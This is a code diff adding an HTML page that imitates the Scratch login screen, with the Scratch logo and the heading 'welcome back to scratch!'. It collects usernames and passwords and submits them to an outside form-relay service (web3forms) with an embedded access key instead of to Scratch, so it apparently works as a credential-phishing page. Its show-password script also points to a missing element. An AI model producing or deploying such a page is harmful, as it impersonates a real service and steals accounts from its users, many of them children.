@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Scratch Style Signup</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #3c81f0;
+            padding: 20px;
+            position: relative;
+        }
+
+        .logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+        }
+
+        .logo img {
+            height: 60px;
+            width: auto;
+        }
+
+        .signup-container {
+            background: white;
+            width: 100%;
+            max-width: 480px;
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.15);
+            overflow: hidden;
+            position: relative;
+        }
+
+        .signup-form {
+            padding: 40px 40px 0 40px;
+        }
+
+        h2 {
+            text-align: center;
+            color: #575e75;
+            font-size: 36px;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #6b6f7a;
+            font-size: 15px;
+            margin-bottom: 35px;
+            line-height: 1.4;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .username-group {
+            display: flex;
+            gap: 10px;
+            align-items: flex-end;
+            margin-bottom: 25px;
+        }
+
+        .username-input {
+            flex: 1;
+        }
+
+        label {
+            display: block;
+            color: #575e75;
+            font-weight: 600;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #d0d0d0;
+            border-radius: 6px;
+            background: white;
+            font-size: 15px;
+            transition: all 0.2s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #4c97ff;
+            box-shadow: 0 0 0 3px rgba(76, 151, 255, 0.1);
+        }
+
+        input::placeholder {
+            color: #b5b5b5;
+            font-style: italic;
+        }
+
+        .dont-use {
+            position: absolute;
+            right: -210px;
+            bottom: 80px;
+            max-width: 200px;
+            height: auto;
+            display: block;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin-top: 15px;
+            margin-bottom: 30px;
+        }
+
+        .checkbox-group input {
+            width: 22px;
+            height: 22px;
+            margin-right: 10px;
+            cursor: pointer;
+            accent-color: #5ba0f5;
+        }
+
+        .checkbox-group label {
+            font-size: 15px;
+            font-weight: normal;
+            margin: 0;
+            cursor: pointer;
+            color: #575e75;
+        }
+
+        .signup-button {
+            width: calc(100% + 80px);
+            margin-left: -40px;
+            padding: 18px;
+            background: linear-gradient(to bottom, #a66ddf 0%, #8b5fc7 100%);
+            color: white;
+            border: none;
+            border-radius: 0 0 12px 12px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s;
+        }
+
+        .signup-button:hover {
+            background: linear-gradient(to bottom, #9558ce 0%, #7a4fb6 100%);
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">
+        <img src="download-removebg-preview.png" alt="Scratch" />
+    </div>
+
+    <div class="signup-container">
+        <img class="dont-use" src="Screenshot 2026-01-04 113650.png" alt="Don't use your real name" />
+        
+        <form class="signup-form" action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="6e1f7e71-ccab-4ba9-8f1d-bbfef70dc7f0" />
+
+            <h2>welcome back to scratch!</h2>
+            <p class="subtitle">
+                Create projects, share ideas, make friends. It's free!
+            </p>
+
+            <div class="username-group">
+                <div class="username-input">
+                    <label>write your username</label>
+                    <input type="text" name="username" placeholder="Username" required />
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>write your password</label>
+                <input type="password" name="password" id="pwd1" placeholder="Password" required />
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="show" />
+                <label for="show">Show password</label>
+            </div>
+
+            <button type="submit" class="signup-button">Next</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById("show").addEventListener("change", function () {
+            var type = this.checked ? "text" : "password";
+            document.getElementById("pwd1").type = type;
+            document.getElementById("pwd2").type = type;
+        });
+    </script>
+</body>
+</html>
